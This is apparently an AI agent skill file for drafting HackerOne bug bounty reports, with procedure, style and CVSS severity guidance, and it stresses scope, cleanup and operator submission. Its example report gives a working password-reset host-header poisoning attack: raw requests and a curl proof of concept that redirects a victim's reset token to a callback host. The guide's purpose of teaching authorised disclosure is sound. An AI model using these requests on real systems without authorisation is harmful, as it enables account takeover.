---
name: report
description: Write a HackerOne report for a verified finding in the voice of an experienced manual bug bounty hunter — exact title, tight summary, numbered reproduction steps with raw requests, a single working proof of concept, demonstrated impact, an honest CVSS vector — then pass the readiness gate. Use when a finding is verified or the user asks to write up, draft, or prepare a report or PoC.
---

<!-- GENERATED from src/skills/report.md by scripts/build_claude.py. Edit that file or the included playbook, then rebuild. -->

# /report — playbook PB-11

`$ARGUMENTS` is the finding id. Procedure: `scripts/sane playbook PB-11`. Style: `docs/05-reporting-style.md`
(read it before writing; it has a complete example). Evidence: `docs/04-evidence-standard.md`. Rating:
`docs/06-severity.md`.

1. **Rebuild the proof from clean state while writing the steps.** Fresh sessions, fresh test objects. Write each
   step as you perform it. Never from memory.
2. **One proof-of-concept artefact** in `findings/F-NNN/poc/`: a `curl` command or short script for server-side
   bugs, one HTML file or URL for client-side bugs, one script for a chain. It must work for someone holding only
   the report, two accounts and the file.
3. **Evidence**, numbered in the order the report cites it: raw request and response text with secrets cut to the
   first and last four characters; screenshots from the scriptable browser with the URL and the account visible.
4. **Write `report.md`** from the template already in the folder:
   - Title: `[bug class] in [exact place] allows [attacker] to [impact]`
   - Summary: three to five sentences; the attacker's starting position and what the victim must do, exactly
   - Steps to Reproduce: numbered, one action each, the literal request, both test accounts named, ends on the observation
   - Proof of Concept · Impact (as demonstrated, with what you deliberately did not do) · Remediation (one or two sentences)
   - Severity: the CVSS vector the proof supports
5. **`cleanup.md`**: everything the testing created and whether it was removed.
6. **Gate:** `scripts/sane gate F-NNN` until it prints READY.
7. **Read it cold as the triager.** Cut every sentence that does not help them reproduce or assess.
8. **Hand over** to the operator: title, severity and vector, asset and scope line, folder path. They submit.

Voice: first person, plain verbs, concrete nouns, no adjectives doing the work of evidence, no "could
potentially", no vulnerability definitions, no bullet lists of everything an attacker "may" do. 250 to 600 words
plus requests for a single bug.

For a known CVE: name the CVE in the title, cite the advisory, show the version evidence and the advisory's
request with the target's response; never attach a weaponised exploit.

Delegate the draft to `report-writer`; the final read and the gate stay in the main session.


---

## Reference: PB-11 · Report: write, gate, hand over

_Included from `playbooks/PB-11-report.md`. That file is the source of truth._

| | |
|---|---|
| **Trigger** | A finding in state `verified` |
| **Entry state** | `findings/F-NNN/` has `claim.md`, `verify.json`, `dupcheck.md` and raw evidence |
| **Runs as** | `report-writer` agent, reviewed in the main session |
| **Timebox** | 60 minutes |
| **Output on disk** | `findings/F-NNN/report.md`, `poc/`, numbered evidence, `cleanup.md`; `finding.json` state `ready` |
| **Next** | The operator submits. Then PB-12 |

The report is the product. A triager spends two to five minutes on first read and decides most of the outcome in
that time. The reports that get paid quickly read as if written by someone who respects that: one clear claim,
steps that work on the first try, proof that cannot be argued with, and impact stated without inflation.
`docs/05-reporting-style.md` has the full style; this is the procedure.

### Steps

1. **Rebuild the proof from clean state while writing the steps.** Do not write steps from memory. Perform each
   one again with fresh sessions and write down exactly what you did as you do it. This is the third
   reproduction and it catches the step you forgot you did.
2. **Make the proof of concept a single artefact** in `findings/F-NNN/poc/`:
   - server-side bugs: one `curl` command or a short script with the two sessions as variables;
   - client-side bugs: one HTML file the triager can open, or one URL;
   - chains: one script that runs the links in order and prints the end state.
   It must work for someone who has only the report, two accounts and the file.
3. **Capture the evidence.** Raw request and response pairs as text (headers included, secrets redacted to the
   first and last four characters). Screenshots for anything visual, taken with the scriptable browser, showing
   the URL bar and both accounts' identities. For multi-step or timing bugs, a short screen recording. Name them
   in order: `01-victim-creates-invoice.png`, `02-attacker-request.txt`, `03-attacker-receives-pdf.png`.
4. **Write `report.md` from the template** (`templates/report.md`, already in the finding folder):
   - **Title:** `[bug class] in [exact place] allows [attacker] to [impact]`. No severity words, no exclamation.
   - **Summary:** three to five sentences; attacker's starting position and what the victim must do, stated exactly.
   - **Steps to Reproduce:** numbered, one action each, the literal request for each, the two test accounts named.
   - **Proof of Concept:** the artefact from step 2 and the list of attachments.
   - **Impact:** who is affected, what the attacker gains, at what scale, as demonstrated. What you deliberately
     did not do.
   - **Remediation:** the check to add and where, in a sentence or two.
   - **Severity:** a CVSS vector that matches the proof (docs/06). Under-claiming slightly earns trust;
     over-claiming earns a downgrade and a slower triage next time.
5. **Write `cleanup.md`:** every object the testing created (accounts, files, records, callbacks, DNS names) and
   whether it was removed. Remove what you can now.
6. **Gate it.** `scripts/sane gate F-NNN`
   Every line must pass: scope, exclusions, sections, numbered steps, a raw request in a code block, a CVSS
   vector, two reproductions, three verification lenses, the duplicate check, no unredacted secret, no
   speculative impact wording. Fix and re-run until it says READY.
7. **Read it once as the triager.** Cold, top to bottom, following your own steps. Cut every sentence that does
   not help them reproduce or assess. Then hand it to the operator with: the title, the severity and vector, the
   asset and scope line, and the path to the folder.

### Decision points

- The steps do not reproduce while you write them → back to PB-09; do not paper over it.
- The impact paragraph needs "could" or "might" to sound serious → the proof is short of the claim. Either prove
  more (PB-10) or claim less.
- Several instances of the same root cause → one report listing all instances, unless the policy says to file
  separately; never split one fix into several reports to multiply bounties.
- The finding touches data you should not have seen (real users' PII appeared in a response) → PB-14 first; the
  report says what category of data was exposed and that you stopped, with the data itself redacted.

### Call it off when

- Not applicable. A verified finding is always written up, even when it will be held for a chain.

### Done when

`scripts/sane gate F-NNN` prints READY and the operator has the hand-over line.

### Hand to the operator when

- Always: submission is theirs. This framework does not submit to HackerOne. They choose the asset, weakness and
  severity fields in the form, paste the report, attach the files, and answer the programme.

---

## Reference: 05 — Reporting style

_Included from `docs/05-reporting-style.md`. That file is the source of truth._

A report is read by a triager who has a queue, has never seen your testing, and will reproduce your steps
literally. The reports that are triaged in an hour and paid without argument share a voice: a working hunter
explaining to a colleague what they found, plainly, with the evidence in the order the reader needs it. This file
describes that voice. `templates/report.md` is its skeleton and `scripts/sane gate` checks its mechanics.

### 1. What a triager does with your report

1. Reads the title and decides which queue and how urgent.
2. Reads the summary and decides whether it is plausible and in scope.
3. Follows the steps with their own two accounts. If a step fails or is ambiguous, they ask ("needs more info")
   and you lose days, or they close it.
4. Reads the impact and sets a severity.
5. Forwards it to an engineer, who reads the remediation line and the raw request.

Write for those five moments. Anything that serves none of them is cut.

### 2. Voice

- **First person, plain verbs.** "I created two accounts", "I sent", "the server returned". Not "it was observed
  that", not "an attacker may be able to".
- **Past tense for what you did, present tense for how the application behaves.** "I changed the `id` to B's
  invoice. The endpoint returns the PDF without checking the organisation."
- **Concrete nouns.** The endpoint path, the parameter name, the role name as the product calls it, the account
  ids. Never "the vulnerable endpoint" when you can write `/api/v2/invoices/{id}/pdf`.
- **No selling.** No "critical vulnerability", "severe", "devastating", "trivially", "simply", "obviously". The
  severity field carries severity; the proof carries weight.
- **No hedging on what you proved, no claiming what you did not.** "This lets any member read every invoice in the
  organisation's sibling tenants; I confirmed it for one invoice of my second account" is exact. "This could
  potentially lead to a full compromise" is neither proven nor specific.
- **Short.** Most good reports are 250 to 600 words plus requests. Long reports are for chains.
- **Courteous, once.** A thank-you line at the end is fine. Apologies, urgency and bounty talk are not.
- **Human, not templated.** Vary sentence length. Say the one thing that was interesting about how you found it
  if it helps the engineer ("the JSON endpoint checks ownership; the PDF route added later does not").

### 3. Title

`[Bug class] in [exact place] allows [attacker's position] to [impact]`

| Weak | Strong |
|---|---|
| IDOR found | IDOR in `/api/v2/invoices/{id}/pdf` lets any logged-in user download other organisations' invoices |
| XSS on example.com | Stored XSS in the ticket subject executes in the support agent's session at `help.example.com/agent` |
| SSRF vulnerability | SSRF in webhook test delivery returns responses from the internal network, including EC2 instance metadata |
| Account takeover!!! | Password reset link is built from the `X-Forwarded-Host` header, allowing one-click account takeover |
| CVE-2021-41773 | Apache 2.4.49 on `files.example.com` is vulnerable to CVE-2021-41773: unauthenticated file read outside the web root |

Under 120 characters where possible. The asset goes in the asset field; put the host in the title only when it
disambiguates.

### 4. Summary

Three to five sentences, answering in order:

1. What is the feature? (one clause, for a reader who does not use the product)
2. What is wrong? (the missing or broken check, as precisely as you know it)
3. Who can exploit it, from what starting position, and what must the victim do?
4. What do they get?

> Organisations can download invoices as PDF. The JSON endpoint `/api/v2/invoices/{id}` verifies that the invoice
> belongs to the caller's organisation, but the PDF endpoint `/api/v2/invoices/{id}/pdf` does not. Any logged-in
> user can download any organisation's invoice by changing the numeric id. Invoice ids are sequential. The PDF
> contains the customer's legal name, billing address, VAT number and line items.

### 5. Steps to reproduce

- Numbered. One action per step. Each step that sends something shows exactly what is sent.
- Name the actors at the top: attacker A, victim B, with ids and roles. Both are your accounts; say so.
- Start from a state the triager can reach: "log in as A". If set-up is needed (create an object as B), it is
  step 1, not an assumption.
- Give raw HTTP for the request that matters, with the minimum headers needed to reproduce. Redact session values
  to the first and last four characters. Keep the body exact.
- Show the response fragment that proves it, not the whole response.
- End with the observation: "The response is B's invoice." A step list that ends on a request leaves the reader
  to guess what success looks like.
- If timing, ordering or a browser matters, say which and why.

For client-side bugs the last steps are: the URL or file the victim opens, in which browser, logged in as whom,
and what happens (with a screenshot showing the URL bar).

### 6. Proof of concept

One artefact that works with only the report in hand.

| Bug | Artefact |
|---|---|
| Server-side, single request | one `curl` command, sessions as variables |
| Server-side, multi-step | a short script (bash or Python, standard library) that prints the end state |
| XSS | the URL, or the payload and where to put it; `alert(document.domain)` and a screenshot. For impact, a second payload that reads the token and sends it to your callback, described and shown on your own account |
| CSRF, CORS, clickjacking, postMessage | a self-contained `.html` file |
| Race condition | the script with the concurrency primitive, and the success rate over N runs |
| Known CVE | the advisory's request and the response from the target; the version evidence; no weaponised exploit |
| Chain | one script that runs the links in order, each link also listed as its own step |

Screenshots: full window, URL bar visible, both accounts' identities visible where it matters, numbered in order.
A recording only when the bug is temporal or multi-window; keep it under two minutes with no editing.

### 7. Impact

State what the proof shows, for whom, at what scale, and what you deliberately did not do.

> An attacker with a free account can read every invoice issued through the platform. Ids are sequential, so the
> full set can be enumerated; I requested only the invoice belonging to my second account (id 48213) and did not
> enumerate further. Each invoice exposes the customer's legal name, address, VAT number, purchased items and
> amounts. This is a cross-tenant disclosure of financial and personal data for all customers.

Rules:

- Tie it to the business in one sentence if it is not obvious: money lost, accounts taken over, data of which
  users.
- State preconditions honestly: authentication, a role, victim interaction, a non-default setting.
- Do not chain speculation onto proof ("and from there an attacker could pivot to..."). If you can show the next
  step, show it; if not, leave it out.
- Give the CVSS vector you believe matches and let it speak for the rating (`docs/06-severity.md`).

### 8. Remediation

One or two sentences, the check and the place. You are not designing their system; you are pointing at the line.

> Apply the same organisation check the JSON endpoint uses before rendering the PDF.

### 9. What never goes in

- Scanner output pasted as the finding. A tool can point; the report shows the manual proof.
- A list of "other things I noticed" that are not findings. One report, one root cause.
- Other users' real data, unredacted secrets, or full dumps of anything.
- Demands, deadlines, bounty expectations, comparisons with other programmes.
- Claims you cannot reproduce on request.
- AI boilerplate: generic vulnerability definitions, "In today's digital landscape", bulleted lists of everything
  an attacker "may" do, OWASP paragraphs. A triager stops reading at the first one.

### 10. A complete example

> **Password reset link is built from the `X-Forwarded-Host` header, allowing account takeover with one click**
>
> **Asset:** `app.example.com` · **Weakness:** Improper Input Validation (CWE-20) ·
> **Severity:** High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (8.1)
>
> ## Summary
>
> The forgot-password flow e-mails a link whose host is taken from the request's `X-Forwarded-Host` header. An
> unauthenticated attacker can request a reset for any e-mail address with that header set to a host they control.
> The victim receives a genuine e-mail from Example whose link points at the attacker's host with a valid reset
> token in the path. If the victim clicks it, the attacker receives the token and can set a new password.
>
> ## Steps to Reproduce
>
> Both accounts are mine. Victim B: `h1user+b@wearehackerone.com`.
>
> 1. Send the reset request for B with the extra header (no session needed):
>
> ```http
> POST /api/auth/forgot-password HTTP/2
> Host: app.example.com
> X-Forwarded-Host: h1user.oast.fun
> Content-Type: application/json
>
> {"email":"h1user+b@wearehackerone.com"}
> ```
>
> 2. Open B's mailbox. The e-mail from `no-reply@example.com` contains:
>    `https://h1user.oast.fun/reset/3f9c…a71e`
> 3. As B, click the link. My callback host logs `GET /reset/3f9c…a71e`.
> 4. Use the token against the real host:
>
> ```http
> POST /api/auth/reset-password HTTP/2
> Host: app.example.com
> Content-Type: application/json
>
> {"token":"3f9c…a71e","password":"<new password>"}
> ```
>
> 5. The response is `200 {"ok":true}` and I can log in as B with the new password.
>
> ## Proof of Concept
>
> ```bash
> curl -s https://app.example.com/api/auth/forgot-password -H 'X-Forwarded-Host: h1user.oast.fun' \
>   -H 'Content-Type: application/json' -d '{"email":"h1user+b@wearehackerone.com"}'
> ```
>
> Attachments: `01-request.txt`, `02-email-with-poisoned-link.png`, `03-callback-log.png`, `04-login-as-B.png`
>
> ## Impact
>
> Any account can be taken over if its owner clicks the link in a password-reset e-mail that Example itself
> sends. The e-mail is authentic (correct sender, SPF and DKIM pass), so there is nothing for the victim to
> distrust. No authentication is needed to trigger it, and it works for any address, including administrators. I
> tested only against my own second account.
>
> ## Remediation
>
> Build the link from the configured canonical host instead of request headers; the confirmation e-mail on
> sign-up already does this.

That is about 330 words. Nothing in it needs explaining, and nothing can be removed.

---

## Reference: 06 — Severity

_Included from `docs/06-severity.md`. That file is the source of truth._

HackerOne programmes rate with CVSS (3.1 on most, 4.0 on some) or with their own table; the policy says which
(PB-00). Rate on what the proof shows. A triager who sees an honest vector trusts the rest of the report.

### 1. CVSS 3.1, the parts that get argued about

`CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_`

| Metric | Choose | Common mistake |
|---|---|---|
| **AV** | `N` for anything over the internet | — |
| **AC** | `L` unless success depends on something outside your control: winning a race with low odds, guessing an unguessable value, a specific configuration, a man-in-the-middle position | marking `L` for a race you win one time in fifty |
| **PR** | `N` unauthenticated; `L` any self-registered account or low role; `H` an admin-level account | `N` for a bug that needs a login because "anyone can sign up". Free sign-up is still `L` |
| **UI** | `R` if a victim must do anything: click, open, visit | `N` for reflected XSS or CSRF |
| **S** | `C` when the impact lands in a different security authority than the vulnerable component: XSS (browser context), SSRF reaching other systems, sandbox escapes. Otherwise `U` | `C` for everything serious |
| **C / I / A** | `H` total loss for the affected scope (any user's data, arbitrary write); `L` limited or non-sensitive; `N` none shown | `H/H/H` for an IDOR that reads one field |

### 2. Typical vectors, as a sanity check

| Finding as proven | Vector | Score |
|---|---|---|
| Unauthenticated RCE | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 9.8 |
| SQL injection reading the database, unauthenticated | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` | 9.1 |
| SSRF returning cloud instance credentials, authenticated | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` | 7.7 |
| Account takeover needing one click | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` | 8.1 |
| Cross-tenant IDOR, read, sensitive data | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` | 6.5 |
| Cross-tenant IDOR, read and write | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | 8.1 |
| IDOR reading low-sensitivity data | `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` | 4.3 |
| Stored XSS hitting other users | `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` | 5.4 |
| Stored XSS leading to admin takeover (shown) | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` | 9.0 |
| Reflected XSS | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | 6.1 |
| CSRF changing the account e-mail (takeover) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` | 8.1 |
| CSRF on a low-value action | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` | 4.3 |
| Open redirect | `AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N` | 4.7 |
| Path traversal reading arbitrary files | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | 7.5 |
| Privilege escalation, member to admin in own tenant | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | 8.1 |
| Subdomain takeover, no sensitive cookies in reach | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | 6.1 |
| Exposed `.git` with source, no secrets | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` | 5.3 |
| Payment bypass (obtaining paid goods free) | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` | 6.5 |
| Blind SSRF with internal reach shown | `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` | 5.0 |

Bands: 9.0–10.0 critical, 7.0–8.9 high, 4.0–6.9 medium, 0.1–3.9 low.

### 3. How programmes move the number

- **Asset tier.** Many programmes cap severity per asset (`max_severity` in the imported scope). A critical on a
  marketing site is paid as the cap says.
- **Data sensitivity.** The same IDOR is medium on display names and high on documents or payment data.
- **Scale.** "Any user" beats "users who shared a link with me". Enumerable ids matter; say whether they are.
- **Privileges required.** A bug needing a paid plan or an invited role is rated below the same bug from a free
  account.
- **Mitigations in place.** HttpOnly cookies, CSP, short-lived tokens lower XSS impact unless you show a way
  around them.
- **Chains.** Rated on the end state; some programmes pay per link.

### 4. Writing the rating

Give the vector and the score, then one sentence for any metric a reader might dispute:

> Medium — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5). `PR:L` because a free account is enough;
> `C:H` because full invoices of any tenant are readable. The programme's own table lists cross-tenant data
> exposure as High; I have left the field at the CVSS result.

When in doubt between two levels, claim the lower and let the evidence argue. Never rate on what the class can do
in theory.

### 5. CVSS 4.0

Where the programme uses it: `AT` (attack requirements) takes over part of what `AC:H` meant; `UI` splits into
`P` (passive: just visiting) and `A` (active: a deliberate action); impact is split into the vulnerable system
(`VC/VI/VA`) and subsequent systems (`SC/SI/SA`), which replaces Scope. XSS is typically
`VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` with `UI:A` for reflected and `UI:P` for stored. `scripts/sane gate` accepts
either version's vector.